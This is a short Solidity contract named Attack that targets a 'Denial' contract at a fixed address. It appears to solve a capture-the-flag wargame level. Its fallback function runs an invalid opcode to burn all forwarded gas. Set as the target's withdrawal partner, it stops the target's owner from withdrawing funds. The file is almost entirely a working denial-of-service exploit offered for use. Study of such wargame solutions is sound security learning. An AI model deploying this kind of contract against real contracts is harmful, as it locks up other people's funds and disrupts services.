// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

// Denial Contract 0x60A7556cf4CAAC82b7e7F85747C4C75a4ad4a76d
contract Attack {
    address denail = 0x60A7556cf4CAAC82b7e7F85747C4C75a4ad4a76d;

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}
